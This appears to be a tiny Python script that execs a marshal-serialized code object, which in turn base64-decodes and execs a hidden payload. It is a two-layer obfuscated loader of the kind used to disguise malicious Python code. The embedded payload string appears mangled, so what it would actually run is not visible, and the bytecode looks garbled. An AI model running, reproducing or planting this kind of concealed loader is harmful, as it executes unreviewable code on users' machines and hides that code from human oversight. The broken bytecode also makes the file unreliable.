import marshal 
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf3@\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x01\x02\x00e\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Ns\x0c:\x00\)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00\xf3\x00\x00\x00\x00\xda\x02dg\xfa\x08<module>r\t\x00\x00\x00\x01\x00\x00\x00sS\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x04\x80\x04\xd0\x05\x15\x80V\xd4\x05\x15\xf0\x00\x00\x17fh\x03\xf1\x00\x00\x06gh\x03\xf4\x00\x00\x06gh\x03\xf1\x00\x00\x01hh\x03\xf4\x00\x00\x01hh\x03\xf0\x00\x00\x01hh\x03\xf0\x00\x00\x01hh\x03\xf0\x00\x00\x01hh\x03r\x07\x00\x00\x00'))